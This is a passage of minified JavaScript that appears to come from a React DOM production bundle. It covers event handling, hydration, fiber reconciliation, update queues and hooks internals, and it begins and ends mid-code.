v(w,h+"leave",b,n,p),u.target=_,u.relatedTarget=y,w=null,jr(p)===d&&(v=new v(m,h+"enter",x,n,p),v.target=y,v.relatedTarget=_,w=v),_=w,b&&x)t:{for(v=b,m=x,h=0,y=v;y;y=Xr(y))h++;for(y=0,w=m;w;w=Xr(w))y++;for(;0<h-y;)v=Xr(v),h--;for(;0<y-h;)m=Xr(m),y--;for(;h--;){if(v===m||m!==null&&v===m.alternate)break t;v=Xr(v),m=Xr(m)}v=null}else v=null;b!==null&&Xp(f,u,b,v,!1),x!==null&&_!==null&&Xp(f,_,x,v,!0)}}e:{if(u=d?ss(d):window,b=u.nodeName&&u.nodeName.toLowerCase(),b==="select"||b==="input"&&u.type==="file")var N=Ey;else if(Up(u))if(Rm)N=Ay;else{N=Ry;var R=Iy}else(b=u.nodeName)&&b.toLowerCase()==="input"&&(u.type==="checkbox"||u.type==="radio")&&(N=Ty);if(N&&(N=N(t,d))){Im(f,N,n,p);break e}R&&R(t,u,d),t==="focusout"&&(R=u._wrapperState)&&R.controlled&&u.type==="number"&&Ec(u,"number",u.value)}switch(R=d?ss(d):window,t){case"focusin":(Up(R)||R.contentEditable==="true")&&(ns=R,Wc=d,bi=null);break;case"focusout":bi=Wc=ns=null;break;case"mousedown":$c=!0;break;case"contextmenu":case"mouseup":case"dragend":$c=!1,Kp(f,n,p);break;case"selectionchange":if(Ly)break;case"keydown":case"keyup":Kp(f,n,p)}var S;if(eu)e:{switch(t){case"compositionstart":var C="onCompositionStart";break e;case"compositionend":C="onCompositionEnd";break e;case"compositionupdate":C="onCompositionUpdate";break e}C=void 0}else ts?Nm(t,n)&&(C="onCompositionEnd"):t==="keydown"&&n.keyCode===229&&(C="onCompositionStart");C&&(km&&n.locale!=="ko"&&(ts||C!=="onCompositionStart"?C==="onCompositionEnd"&&ts&&(S=jm()):(Gn=p,Xd="value"in Gn?Gn.value:Gn.textContent,ts=!0)),R=ma(d,C),0<R.length&&(C=new Fp(C,t,null,n,p),f.push({event:C,listeners:R}),S?C.data=S:(S=Em(n),S!==null&&(C.data=S)))),(S=Sy?Cy(t,n):jy(t,n))&&(d=ma(d,"onBeforeInput"),0<d.length&&(p=new Fp("onBeforeInput","beforeinput",null,n,p),f.push({event:p,listeners:d}),p.data=S))}Wm(f,e)})}function Fi(t,e,n){return{instance:t,listener:e,currentTarget:n}}function ma(t,e){for(var n=e+"Capture",r=[];t!==null;){var s=t,o=s.stateNode;s.tag===5&&o!==null&&(s=o,o=Ai(t,n),o!=null&&r.unshift(Fi(t,o,s)),o=Ai(t,e),o!=null&&r.push(Fi(t,o,s))),t=t.return}return r}function Xr(t){if(t===null)return null;do t=t.return;while(t&&t.tag!==5);return t||null}function Xp(t,e,n,r,s){for(var o=e._reactName,a=[];n!==null&&n!==r;){var l=n,c=l.alternate,d=l.stateNode;if(c!==null&&c===r)break;l.tag===5&&d!==null&&(l=d,s?(c=Ai(n,o),c!=null&&a.unshift(Fi(n,c,l))):s||(c=Ai(n,o),c!=null&&a.push(Fi(n,c,l)))),n=n.return}a.length!==0&&t.push({event:e,listeners:a})}var Fy=/\r\n?/g,Wy=/\u0000|\uFFFD/g;function Jp(t){return(typeof t=="string"?t:""+t).replace(Fy,`
`).replace(Wy,"")}function Mo(t,e,n){if(e=Jp(e),Jp(t)!==e&&n)throw Error(O(425))}function ga(){}var Bc=null,Uc=null;function Hc(t,e){return t==="textarea"||t==="noscript"||typeof e.children=="string"||typeof e.children=="number"||typeof e.dangerouslySetInnerHTML=="object"&&e.dangerouslySetInnerHTML!==null&&e.dangerouslySetInnerHTML.__html!=null}var Vc=typeof setTimeout=="function"?setTimeout:void 0,$y=typeof clearTimeout=="function"?clearTimeout:void 0,Zp=typeof Promise=="function"?Promise:void 0,By=typeof queueMicrotask=="function"?queueMicrotask:typeof Zp<"u"?function(t){return Zp.resolve(null).then(t).catch(Uy)}:Vc;function Uy(t){setTimeout(function(){throw t})}function Ql(t,e){var n=e,r=0;do{var s=n.nextSibling;if(t.removeChild(n),s&&s.nodeType===8)if(n=s.data,n==="/$"){if(r===0){t.removeChild(s),Li(e);return}r--}else n!=="$"&&n!=="$?"&&n!=="$!"||r++;n=s}while(n);Li(e)}function Jn(t){for(;t!=null;t=t.nextSibling){var e=t.nodeType;if(e===1||e===3)break;if(e===8){if(e=t.data,e==="$"||e==="$!"||e==="$?")break;if(e==="/$")return null}}return t}function ef(t){t=t.previousSibling;for(var e=0;t;){if(t.nodeType===8){var n=t.data;if(n==="$"||n==="$!"||n==="$?"){if(e===0)return t;e--}else n==="/$"&&e++}t=t.previousSibling}return null}var zs=Math.random().toString(36).slice(2),pn="__reactFiber$"+zs,Wi="__reactProps$"+zs,Tn="__reactContainer$"+zs,Gc="__reactEvents$"+zs,Hy="__reactListeners$"+zs,Vy="__reactHandles$"+zs;function jr(t){var e=t[pn];if(e)return e;for(var n=t.parentNode;n;){if(e=n[Tn]||n[pn]){if(n=e.alternate,e.child!==null||n!==null&&n.child!==null)for(t=ef(t);t!==null;){if(n=t[pn])return n;t=ef(t)}return e}t=n,n=t.parentNode}return null}function co(t){return t=t[pn]||t[Tn],!t||t.tag!==5&&t.tag!==6&&t.tag!==13&&t.tag!==3?null:t}function ss(t){if(t.tag===5||t.tag===6)return t.stateNode;throw Error(O(33))}function nl(t){return t[Wi]||null}var Yc=[],is=-1;function fr(t){return{current:t}}function _e(t){0>is||(t.current=Yc[is],Yc[is]=null,is--)}function ye(t,e){is++,Yc[is]=t.current,t.current=e}var lr={},ot=fr(lr),St=fr(!1),Tr=lr;function ws(t,e){var n=t.type.contextTypes;if(!n)return lr;var r=t.stateNode;if(r&&r.__reactInternalMemoizedUnmaskedChildContext===e)return r.__reactInternalMemoizedMaskedChildContext;var s={},o;for(o in n)s[o]=e[o];return r&&(t=t.stateNode,t.__reactInternalMemoizedUnmaskedChildContext=e,t.__reactInternalMemoizedMaskedChildContext=s),s}function Ct(t){return t=t.childContextTypes,t!=null}function xa(){_e(St),_e(ot)}function tf(t,e,n){if(ot.current!==lr)throw Error(O(168));ye(ot,e),ye(St,n)}function Bm(t,e,n){var r=t.stateNode;if(e=e.childContextTypes,typeof r.getChildContext!="function")return n;r=r.getChildContext();for(var s in r)if(!(s in e))throw Error(O(108,I0(t)||"Unknown",s));return Ee({},n,r)}function va(t){return t=(t=t.stateNode)&&t.__reactInternalMemoizedMergedChildContext||lr,Tr=ot.current,ye(ot,t),ye(St,St.current),!0}function nf(t,e,n){var r=t.stateNode;if(!r)throw Error(O(169));n?(t=Bm(t,e,Tr),r.__reactInternalMemoizedMergedChildContext=t,_e(St),_e(ot),ye(ot,t)):_e(St),ye(St,n)}var Cn=null,rl=!1,ql=!1;function Um(t){Cn===null?Cn=[t]:Cn.push(t)}function Gy(t){rl=!0,Um(t)}function hr(){if(!ql&&Cn!==null){ql=!0;var t=0,e=pe;try{var n=Cn;for(pe=1;t<n.length;t++){var r=n[t];do r=r(!0);while(r!==null)}Cn=null,rl=!1}catch(s){throw Cn!==null&&(Cn=Cn.slice(t+1)),hm(Yd,hr),s}finally{pe=e,ql=!1}}return null}var os=[],as=0,ya=null,ba=0,Ft=[],Wt=0,Ar=null,jn=1,kn="";function _r(t,e){os[as++]=ba,os[as++]=ya,ya=t,ba=e}function Hm(t,e,n){Ft[Wt++]=jn,Ft[Wt++]=kn,Ft[Wt++]=Ar,Ar=t;var r=jn;t=kn;var s=32-tn(r)-1;r&=~(1<<s),n+=1;var o=32-tn(e)+s;if(30<o){var a=s-s%5;o=(r&(1<<a)-1).toString(32),r>>=a,s-=a,jn=1<<32-tn(e)+s|n<<s|r,kn=o+t}else jn=1<<o|n<<s|r,kn=t}function nu(t){t.return!==null&&(_r(t,1),Hm(t,1,0))}function ru(t){for(;t===ya;)ya=os[--as],os[as]=null,ba=os[--as],os[as]=null;for(;t===Ar;)Ar=Ft[--Wt],Ft[Wt]=null,kn=Ft[--Wt],Ft[Wt]=null,jn=Ft[--Wt],Ft[Wt]=null}var Tt=null,It=null,Ce=!1,Jt=null;function Vm(t,e){var n=$t(5,null,null,0);n.elementType="DELETED",n.stateNode=e,n.return=t,e=t.deletions,e===null?(t.deletions=[n],t.flags|=16):e.push(n)}function rf(t,e){switch(t.tag){case 5:var n=t.type;return e=e.nodeType!==1||n.toLowerCase()!==e.nodeName.toLowerCase()?null:e,e!==null?(t.stateNode=e,Tt=t,It=Jn(e.firstChild),!0):!1;case 6:return e=t.pendingProps===""||e.nodeType!==3?null:e,e!==null?(t.stateNode=e,Tt=t,It=null,!0):!1;case 13:return e=e.nodeType!==8?null:e,e!==null?(n=Ar!==null?{id:jn,overflow:kn}:null,t.memoizedState={dehydrated:e,treeContext:n,retryLane:1073741824},n=$t(18,null,null,0),n.stateNode=e,n.return=t,t.child=n,Tt=t,It=null,!0):!1;default:return!1}}function Kc(t){return(t.mode&1)!==0&&(t.flags&128)===0}function Qc(t){if(Ce){var e=It;if(e){var n=e;if(!rf(t,e)){if(Kc(t))throw Error(O(418));e=Jn(n.nextSibling);var r=Tt;e&&rf(t,e)?Vm(r,n):(t.flags=t.flags&-4097|2,Ce=!1,Tt=t)}}else{if(Kc(t))throw Error(O(418));t.flags=t.flags&-4097|2,Ce=!1,Tt=t}}}function sf(t){for(t=t.return;t!==null&&t.tag!==5&&t.tag!==3&&t.tag!==13;)t=t.return;Tt=t}function Oo(t){if(t!==Tt)return!1;if(!Ce)return sf(t),Ce=!0,!1;var e;if((e=t.tag!==3)&&!(e=t.tag!==5)&&(e=t.type,e=e!=="head"&&e!=="body"&&!Hc(t.type,t.memoizedProps)),e&&(e=It)){if(Kc(t))throw Gm(),Error(O(418));for(;e;)Vm(t,e),e=Jn(e.nextSibling)}if(sf(t),t.tag===13){if(t=t.memoizedState,t=t!==null?t.dehydrated:null,!t)throw Error(O(317));e:{for(t=t.nextSibling,e=0;t;){if(t.nodeType===8){var n=t.data;if(n==="/$"){if(e===0){It=Jn(t.nextSibling);break e}e--}else n!=="$"&&n!=="$!"&&n!=="$?"||e++}t=t.nextSibling}It=null}}else It=Tt?Jn(t.stateNode.nextSibling):null;return!0}function Gm(){for(var t=It;t;)t=Jn(t.nextSibling)}function Ss(){It=Tt=null,Ce=!1}function su(t){Jt===null?Jt=[t]:Jt.push(t)}var Yy=Mn.ReactCurrentBatchConfig;function si(t,e,n){if(t=n.ref,t!==null&&typeof t!="function"&&typeof t!="object"){if(n._owner){if(n=n._owner,n){if(n.tag!==1)throw Error(O(309));var r=n.stateNode}if(!r)throw Error(O(147,t));var s=r,o=""+t;return e!==null&&e.ref!==null&&typeof e.ref=="function"&&e.ref._stringRef===o?e.ref:(e=function(a){var l=s.refs;a===null?delete l[o]:l[o]=a},e._stringRef=o,e)}if(typeof t!="string")throw Error(O(284));if(!n._owner)throw Error(O(290,t))}return t}function Fo(t,e){throw t=Object.prototype.toString.call(e),Error(O(31,t==="[object Object]"?"object with keys {"+Object.keys(e).join(", ")+"}":t))}function of(t){var e=t._init;return e(t._payload)}function Ym(t){function e(m,h){if(t){var y=m.deletions;y===null?(m.deletions=[h],m.flags|=16):y.push(h)}}function n(m,h){if(!t)return null;for(;h!==null;)e(m,h),h=h.sibling;return null}function r(m,h){for(m=new Map;h!==null;)h.key!==null?m.set(h.key,h):m.set(h.index,h),h=h.sibling;return m}function s(m,h){return m=nr(m,h),m.index=0,m.sibling=null,m}function o(m,h,y){return m.index=y,t?(y=m.alternate,y!==null?(y=y.index,y<h?(m.flags|=2,h):y):(m.flags|=2,h)):(m.flags|=1048576,h)}function a(m){return t&&m.alternate===null&&(m.flags|=2),m}function l(m,h,y,w){return h===null||h.tag!==6?(h=rc(y,m.mode,w),h.return=m,h):(h=s(h,y),h.return=m,h)}function c(m,h,y,w){var N=y.type;return N===es?p(m,h,y.props.children,w,y.key):h!==null&&(h.elementType===N||typeof N=="object"&&N!==null&&N.$$typeof===Bn&&of(N)===h.type)?(w=s(h,y.props),w.ref=si(m,h,y),w.return=m,w):(w=sa(y.type,y.key,y.props,null,m.mode,w),w.ref=si(m,h,y),w.return=m,w)}function d(m,h,y,w){return h===null||h.tag!==4||h.stateNode.containerInfo!==y.containerInfo||h.stateNode.implementation!==y.implementation?(h=sc(y,m.mode,w),h.return=m,h):(h=s(h,y.children||[]),h.return=m,h)}function p(m,h,y,w,N){return h===null||h.tag!==7?(h=Rr(y,m.mode,w,N),h.return=m,h):(h=s(h,y),h.return=m,h)}function f(m,h,y){if(typeof h=="string"&&h!==""||typeof h=="number")return h=rc(""+h,m.mode,y),h.return=m,h;if(typeof h=="object"&&h!==null){switch(h.$$typeof){case Eo:return y=sa(h.type,h.key,h.props,null,m.mode,y),y.ref=si(m,null,h),y.return=m,y;case Zr:return h=sc(h,m.mode,y),h.return=m,h;case Bn:var w=h._init;return f(m,w(h._payload),y)}if(fi(h)||Zs(h))return h=Rr(h,m.mode,y,null),h.return=m,h;Fo(m,h)}return null}function u(m,h,y,w){var N=h!==null?h.key:null;if(typeof y=="string"&&y!==""||typeof y=="number")return N!==null?null:l(m,h,""+y,w);if(typeof y=="object"&&y!==null){switch(y.$$typeof){case Eo:return y.key===N?c(m,h,y,w):null;case Zr:return y.key===N?d(m,h,y,w):null;case Bn:return N=y._init,u(m,h,N(y._payload),w)}if(fi(y)||Zs(y))return N!==null?null:p(m,h,y,w,null);Fo(m,y)}return null}function b(m,h,y,w,N){if(typeof w=="string"&&w!==""||typeof w=="number")return m=m.get(y)||null,l(h,m,""+w,N);if(typeof w=="object"&&w!==null){switch(w.$$typeof){case Eo:return m=m.get(w.key===null?y:w.key)||null,c(h,m,w,N);case Zr:return m=m.get(w.key===null?y:w.key)||null,d(h,m,w,N);case Bn:var R=w._init;return b(m,h,y,R(w._payload),N)}if(fi(w)||Zs(w))return m=m.get(y)||null,p(h,m,w,N,null);Fo(h,w)}return null}function x(m,h,y,w){for(var N=null,R=null,S=h,C=h=0,j=null;S!==null&&C<y.length;C++){S.index>C?(j=S,S=null):j=S.sibling;var P=u(m,S,y[C],w);if(P===null){S===null&&(S=j);break}t&&S&&P.alternate===null&&e(m,S),h=o(P,h,C),R===null?N=P:R.sibling=P,R=P,S=j}if(C===y.length)return n(m,S),Ce&&_r(m,C),N;if(S===null){for(;C<y.length;C++)S=f(m,y[C],w),S!==null&&(h=o(S,h,C),R===null?N=S:R.sibling=S,R=S);return Ce&&_r(m,C),N}for(S=r(m,S);C<y.length;C++)j=b(S,m,C,y[C],w),j!==null&&(t&&j.alternate!==null&&S.delete(j.key===null?C:j.key),h=o(j,h,C),R===null?N=j:R.sibling=j,R=j);return t&&S.forEach(function(z){return e(m,z)}),Ce&&_r(m,C),N}function v(m,h,y,w){var N=Zs(y);if(typeof N!="function")throw Error(O(150));if(y=N.call(y),y==null)throw Error(O(151));for(var R=N=null,S=h,C=h=0,j=null,P=y.next();S!==null&&!P.done;C++,P=y.next()){S.index>C?(j=S,S=null):j=S.sibling;var z=u(m,S,P.value,w);if(z===null){S===null&&(S=j);break}t&&S&&z.alternate===null&&e(m,S),h=o(z,h,C),R===null?N=z:R.sibling=z,R=z,S=j}if(P.done)return n(m,S),Ce&&_r(m,C),N;if(S===null){for(;!P.done;C++,P=y.next())P=f(m,P.value,w),P!==null&&(h=o(P,h,C),R===null?N=P:R.sibling=P,R=P);return Ce&&_r(m,C),N}for(S=r(m,S);!P.done;C++,P=y.next())P=b(S,m,C,P.value,w),P!==null&&(t&&P.alternate!==null&&S.delete(P.key===null?C:P.key),h=o(P,h,C),R===null?N=P:R.sibling=P,R=P);return t&&S.forEach(function(M){return e(m,M)}),Ce&&_r(m,C),N}function _(m,h,y,w){if(typeof y=="object"&&y!==null&&y.type===es&&y.key===null&&(y=y.props.children),typeof y=="object"&&y!==null){switch(y.$$typeof){case Eo:e:{for(var N=y.key,R=h;R!==null;){if(R.key===N){if(N=y.type,N===es){if(R.tag===7){n(m,R.sibling),h=s(R,y.props.children),h.return=m,m=h;break e}}else if(R.elementType===N||typeof N=="object"&&N!==null&&N.$$typeof===Bn&&of(N)===R.type){n(m,R.sibling),h=s(R,y.props),h.ref=si(m,R,y),h.return=m,m=h;break e}n(m,R);break}else e(m,R);R=R.sibling}y.type===es?(h=Rr(y.props.children,m.mode,w,y.key),h.return=m,m=h):(w=sa(y.type,y.key,y.props,null,m.mode,w),w.ref=si(m,h,y),w.return=m,m=w)}return a(m);case Zr:e:{for(R=y.key;h!==null;){if(h.key===R)if(h.tag===4&&h.stateNode.containerInfo===y.containerInfo&&h.stateNode.implementation===y.implementation){n(m,h.sibling),h=s(h,y.children||[]),h.return=m,m=h;break e}else{n(m,h);break}else e(m,h);h=h.sibling}h=sc(y,m.mode,w),h.return=m,m=h}return a(m);case Bn:return R=y._init,_(m,h,R(y._payload),w)}if(fi(y))return x(m,h,y,w);if(Zs(y))return v(m,h,y,w);Fo(m,y)}return typeof y=="string"&&y!==""||typeof y=="number"?(y=""+y,h!==null&&h.tag===6?(n(m,h.sibling),h=s(h,y),h.return=m,m=h):(n(m,h),h=rc(y,m.mode,w),h.return=m,m=h),a(m)):n(m,h)}return _}var Cs=Ym(!0),Km=Ym(!1),_a=fr(null),wa=null,ls=null,iu=null;function ou(){iu=ls=wa=null}function au(t){var e=_a.current;_e(_a),t._currentValue=e}function qc(t,e,n){for(;t!==null;){var r=t.alternate;if((t.childLanes&e)!==e?(t.childLanes|=e,r!==null&&(r.childLanes|=e)):r!==null&&(r.childLanes&e)!==e&&(r.childLanes|=e),t===n)break;t=t.return}}function gs(t,e){wa=t,iu=ls=null,t=t.dependencies,t!==null&&t.firstContext!==null&&(t.lanes&e&&(_t=!0),t.firstContext=null)}function Ht(t){var e=t._currentValue;if(iu!==t)if(t={context:t,memoizedValue:e,next:null},ls===null){if(wa===null)throw Error(O(308));ls=t,wa.dependencies={lanes:0,firstContext:t}}else ls=ls.next=t;return e}var kr=null;function lu(t){kr===null?kr=[t]:kr.push(t)}function Qm(t,e,n,r){var s=e.interleaved;return s===null?(n.next=n,lu(e)):(n.next=s.next,s.next=n),e.interleaved=n,An(t,r)}function An(t,e){t.lanes|=e;var n=t.alternate;for(n!==null&&(n.lanes|=e),n=t,t=t.return;t!==null;)t.childLanes|=e,n=t.alternate,n!==null&&(n.childLanes|=e),n=t,t=t.return;return n.tag===3?n.stateNode:null}var Un=!1;function cu(t){t.updateQueue={baseState:t.memoizedState,firstBaseUpdate:null,lastBaseUpdate:null,shared:{pending:null,interleaved:null,lanes:0},effects:null}}function qm(t,e){t=t.updateQueue,e.updateQueue===t&&(e.updateQueue={baseState:t.baseState,firstBaseUpdate:t.firstBaseUpdate,lastBaseUpdate:t.lastBaseUpdate,shared:t.shared,effects:t.effects})}function En(t,e){return{eventTime:t,lane:e,tag:0,payload:null,callback:null,next:null}}function Zn(t,e,n){var r=t.updateQueue;if(r===null)return null;if(r=r.shared,de&2){var s=r.pending;return s===null?e.next=e:(e.next=s.next,s.next=e),r.pending=e,An(t,n)}return s=r.interleaved,s===null?(e.next=e,lu(r)):(e.next=s.next,s.next=e),r.interleaved=e,An(t,n)}function Jo(t,e,n){if(e=e.updateQueue,e!==null&&(e=e.shared,(n&4194240)!==0)){var r=e.lanes;r&=t.pendingLanes,n|=r,e.lanes=n,Kd(t,n)}}function af(t,e){var n=t.updateQueue,r=t.alternate;if(r!==null&&(r=r.updateQueue,n===r)){var s=null,o=null;if(n=n.firstBaseUpdate,n!==null){do{var a={eventTime:n.eventTime,lane:n.lane,tag:n.tag,payload:n.payload,callback:n.callback,next:null};o===null?s=o=a:o=o.next=a,n=n.next}while(n!==null);o===null?s=o=e:o=o.next=e}else s=o=e;n={baseState:r.baseState,firstBaseUpdate:s,lastBaseUpdate:o,shared:r.shared,effects:r.effects},t.updateQueue=n;return}t=n.lastBaseUpdate,t===null?n.firstBaseUpdate=e:t.next=e,n.lastBaseUpdate=e}function Sa(t,e,n,r){var s=t.updateQueue;Un=!1;var o=s.firstBaseUpdate,a=s.lastBaseUpdate,l=s.shared.pending;if(l!==null){s.shared.pending=null;var c=l,d=c.next;c.next=null,a===null?o=d:a.next=d,a=c;var p=t.alternate;p!==null&&(p=p.updateQueue,l=p.lastBaseUpdate,l!==a&&(l===null?p.firstBaseUpdate=d:l.next=d,p.lastBaseUpdate=c))}if(o!==null){var f=s.baseState;a=0,p=d=c=null,l=o;do{var u=l.lane,b=l.eventTime;if((r&u)===u){p!==null&&(p=p.next={eventTime:b,lane:0,tag:l.tag,payload:l.payload,callback:l.callback,next:null});e:{var x=t,v=l;switch(u=e,b=n,v.tag){case 1:if(x=v.payload,typeof x=="function"){f=x.call(b,f,u);break e}f=x;break e;case 3:x.flags=x.flags&-65537|128;case 0:if(x=v.payload,u=typeof x=="function"?x.call(b,f,u):x,u==null)break e;f=Ee({},f,u);break e;case 2:Un=!0}}l.callback!==null&&l.lane!==0&&(t.flags|=64,u=s.effects,u===null?s.effects=[l]:u.push(l))}else b={eventTime:b,lane:u,tag:l.tag,payload:l.payload,callback:l.callback,next:null},p===null?(d=p=b,c=f):p=p.next=b,a|=u;if(l=l.next,l===null){if(l=s.shared.pending,l===null)break;u=l,l=u.next,u.next=null,s.lastBaseUpdate=u,s.shared.pending=null}}while(!0);if(p===null&&(c=f),s.baseState=c,s.firstBaseUpdate=d,s.lastBaseUpdate=p,e=s.shared.interleaved,e!==null){s=e;do a|=s.lane,s=s.next;while(s!==e)}else o===null&&(s.shared.lanes=0);Dr|=a,t.lanes=a,t.memoizedState=f}}function lf(t,e,n){if(t=e.effects,e.effects=null,t!==null)for(e=0;e<t.length;e++){var r=t[e],s=r.callback;if(s!==null){if(r.callback=null,r=n,typeof s!="function")throw Error(O(191,s));s.call(r)}}}var uo={},hn=fr(uo),$i=fr(uo),Bi=fr(uo);function Nr(t){if(t===uo)throw Error(O(174));return t}function du(t,e){switch(ye(Bi,e),ye($i,t),ye(hn,uo),t=e.nodeType,t){case 9:case 11:e=(e=e.documentElement)?e.namespaceURI:Rc(null,"");break;default:t=t===8?e.parentNode:e,e=t.namespaceURI||null,t=t.tagName,e=Rc(e,t)}_e(hn),ye(hn,e)}function js(){_e(hn),_e($i),_e(Bi)}function Xm(t){Nr(Bi.current);var e=Nr(hn.current),n=Rc(e,t.type);e!==n&&(ye($i,t),ye(hn,n))}function uu(t){$i.current===t&&(_e(hn),_e($i))}var ke=fr(0);function Ca(t){for(var e=t;e!==null;){if(e.tag===13){var n=e.memoizedState;if(n!==null&&(n=n.dehydrated,n===null||n.data==="$?"||n.data==="$!"))return e}else if(e.tag===19&&e.memoizedProps.revealOrder!==void 0){if(e.flags&128)return e}else if(e.child!==null){e.child.return=e,e=e.child;continue}if(e===t)break;for(;e.sibling===null;){if(e.return===null||e.return===t)return null;e=e.return}e.sibling.return=e.return,e=e.sibling}return null}var Xl=[];function pu(){for(var t=0;t<Xl.length;t++)Xl[t]._workInProgressVersionPrimary=null;Xl.length=0}var Zo=Mn.ReactCurrentDispatcher,Jl=Mn.ReactCurrentBatchConfig,Pr=0,Ne=null,$e=null,Ye=null,ja=!1,_i=!1,Ui=0,Ky=0;function rt(){throw Error(O(321))}function fu(t,e){if(e===null)return!1;for(var n=0;n<e.length&&n<t.length;n++)if(!on(t[n],e[n]))return!1;return!0}function hu(t,e,n,r,s,o){if(Pr=o,Ne=e,e.memoizedState=null,e.updateQueue=null,e.lanes=0,Zo.current=t===null||t.memoizedState===null?Jy:Zy,t=n(r,s),_i){o=0;do{if(_i=!1,Ui=0,25<=o)throw Error(O(301));o+=1,Ye=$e=null,e.updateQueue=null,Zo.current=eb,t=n(r,s)}while(_i)}if(Zo.current=ka,e=$e!==null&&$e.next!==null,Pr=0,Ye=$e=Ne=null,ja=!1,e)throw Error(O(300));return t}function mu(){var t=Ui!==0;return Ui=0,t}function un(){var t={memoizedState:null,baseState:null,baseQueue:null,queue:null,next:null};return Ye===null?Ne.memoizedState=Ye=t:Ye=Ye.next=t,Ye}function Vt(){if($e===null){var t=Ne.alternate;t=t!==null?t.memoizedState:null}else t=$e.next;var e=Ye===null?Ne.memoizedState:Ye.next;if(e!==null)Ye=e,$e=t;else{if(t===null)throw Error(O(310));$e=t,t={memoizedState:$e.memoizedState,baseState:$e.baseState,baseQueue:$e.baseQueue,queue:$e.queue,next:null},Ye===null?Ne.memoizedState=Ye=t:Ye=Ye.next=t}return Ye}function Hi(t,e){return typeof e=="function"?e(t):e}function Zl(t){var e=Vt(),n=e.queue;if(n===null)throw Error(O(311));n.lastRenderedReducer=t;var r=$e,s=r.baseQueue,o=n.pending;if(o!==null){if(s!==null){var a=s.next;s.next=o.next,o.next=a}r.baseQueue=s=o,n.pending=null}if(s!==null){o=s.next,r=r.baseState;var l=a=null,c=null,d=o;do{var p=d.lane;if((Pr&p)===p)c!==null&&(c=c.next={lane:0,action:d.action,hasEagerState:d.hasEagerState,eagerState:d.eagerState,next:null}),r=d.hasEagerState?d.eagerState:t(r,d.action);else{var f={lane:p,action:d.action,hasEagerState:d.hasEagerState,eagerState:d.eagerState,next:null};c===null?(l=c=f,a=r):c=c.next=f,Ne.lanes|=p,Dr|=p}d=d.next}while(d!==null&&d!==o);c===null?a=r:c.next=l,on(r,e.memoizedState)||(_t=!0),e.memoizedState=r,e.baseState=a,e.baseQueue=c,n.lastRenderedState=r}if(t=n.interleaved,t!==null){s=t;do o=s.lane,Ne.lanes|=o,Dr|=o,s=s.next;while(s!==t)}else s===null&&(n.lanes=0);return[e.memoizedState,n.dispatch]}function ec(t){var e=Vt(),n=e.queue;if(n===null)throw Error(O(311));n.lastRenderedReducer=t;var r=n.dispatch,s=n.pending,o=e.memoizedState;if(s!==null){n.pending=null;var a=s=s.next;do o=t(o,a.action),a=a.next;while(a!==s);on(o,e.memoizedState)||(_t=!0),e.memoizedState=o,e.baseQueue===null&&(e.baseState=o),n.lastRenderedState=o}return[o,r]}function Jm(){}function Zm(t,e){var n=Ne,r=Vt(),s=e(),o=!on(r.memoizedState,s);if(o&&(r.memoizedState=s,_t=!0),r=r.queue,gu(ng.bind(null,n,r,t),[t]),r.getSnapshot!==e||o||Ye!==null&&Ye.memoizedState.tag&1){if(n.flags|=2048,Vi(9,tg.bind(null,n,r,s,e),void 0,null),Qe===null)throw Error(O(349));Pr&30||eg(n,e,s)}return s}function eg(t,e,n){t.flags|=16384,t={getSnapshot:e,value:n},e=Ne.updateQueue,e===null?(e={lastEffect:null,stores:null},Ne.updateQueue=e,e.stores=[t]):(n=e.stores,n===null?e.stores=[t]:n.push(t))}function tg(t,e,n,r){e.value=n,e.getSnapshot=r,rg(e)&&sg(t)}function ng(t,e,n){return n(function(){rg(e)&&sg(t)})}function rg(t){var e=t.getSnapshot;t=t.value;try{var n=e();return!on(t,n)}catch{return!0}}function sg(t){var e=An(t,1);e!==null&&nn(e,t,1,-1)}function cf(t){var e=un();return typeof t=="function"&&(t=t()),e.memoizedState=e.baseState=t,t={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:Hi,lastRenderedState:t},e.queue=t,t=t.dispatch=Xy.bind(null,Ne,t),[e.memoizedState,t]}function Vi(t,e,n,r){return t={tag:t,create:e,destroy:n,deps:r,next:null},e=Ne.updateQueue,e===null?(e={lastEffect:null,stores:null},Ne.updateQueue=e,e.lastEffect=t.next=t):(n=e.lastEffect,n===null?e.lastEffect=t.next=t:(r=n.next,n.next=t,t.next=r,e.lastEffect=t)),t}function ig(){return Vt().memoizedState}function ea(t,e,n,r){var s=un();Ne.flags|=t,s.memoizedState=Vi(1|e,n,void 0,r===void 0?null:r)}function sl(t,e,n,r){var s=Vt();r=r===void 0?null:r;var o=void 0;if($e!==null){var a=$e.memoizedState;if(o=a.destroy,r!==null&&fu(r,a.deps)){s.memoizedState=Vi(e,n,o,r);return}}Ne.flags|=t,s.memoizedState=Vi(1|e,n,o,r)}function df(t,e){return ea(8390656,8,t,e)}function gu(t,e){return sl(2048,8,t,e)}function og(t,e){return sl(4,2,t,e)}function ag(t,e){return sl(4,4,t,e)}function lg(t,e){if(typeof e=="function")return t=t(),e(t),function(){e(null)};if(e!=null)return t=t(),e.current=t,function(){e.current=null}}function cg(t,e,n){return n=n!=null?n.concat([t]):null,sl(4,4,lg.bind(null,e,t),n)}function xu(){}function dg(t,e){var n=Vt();e=e===void 0?null:e;var r=n.memoizedState;return r!==null&&e!==null&&fu(e,r[1])?r[0]:(n.memoizedState=[t,e],t)}function ug(t,e){var n=Vt();e=e===void 0?null:e;var r=n.memoizedState;return r!==null&&e!==null&&fu(e,r[1])?r[0]:(t=t(),n.memoizedState=[t,e],t)}function pg(t,e,n){return Pr&21?(on(n,e)||(n=xm(),Ne.lanes|=n,Dr|=n,t.baseState=!0),e):(t.baseState&&(t.baseState=!1,_t=!0),t.memoizedState=n)}function Qy(t,e){var n=pe;pe=n!==0&&4>n?n:4,t(!0);var r=Jl.transition;Jl.transition={};try{t(!1),e()}finally{pe=n,Jl.transition=r}}function fg(){return Vt().memoizedState}function qy(t,e,n){var r=tr(t);if(n={lane:r,action:n,hasEagerState:!1,eagerState:null,next:null},hg(t))mg(e,n);else if(n=Qm(t,e,n,r),n!==null){var s=pt();nn(n,t,r,s),gg(n,e,r)}}function Xy(t,e,n){var r=tr(t),s={lane:r,action:n,hasEagerState:!1,eagerState:null,next:null};if(hg(t))mg(e,s);else{var o=t.alternate;if(t.lanes===0&&(o===null||o.lanes===0)&&(o=e.lastRenderedReducer,o!==null))try{var a=e.lastRenderedState,l=o(a,n);if(s.hasEagerState=!0,s.eagerState=l,on(l,a)){var 